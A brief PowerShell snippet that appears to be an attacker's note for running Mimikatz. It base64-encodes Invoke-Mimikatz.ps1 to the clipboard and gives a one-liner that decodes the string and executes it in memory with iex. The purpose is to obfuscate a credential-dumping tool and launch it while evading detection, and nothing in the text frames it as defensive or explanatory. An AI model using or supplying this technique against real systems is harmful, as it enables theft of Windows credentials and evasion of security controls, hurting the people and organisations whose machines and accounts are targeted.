
#base64 encoding to clip board

$temp = Get-Content .\Invoke-Mimikatz.ps1
$bytes = [System.Text.Encoding]::UTF8.GetBytes($temp)
$encoded = [System.Convert]::ToBase64String($bytes) | clip.exe


#one-liner to launch in PS
[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('base64')) | iex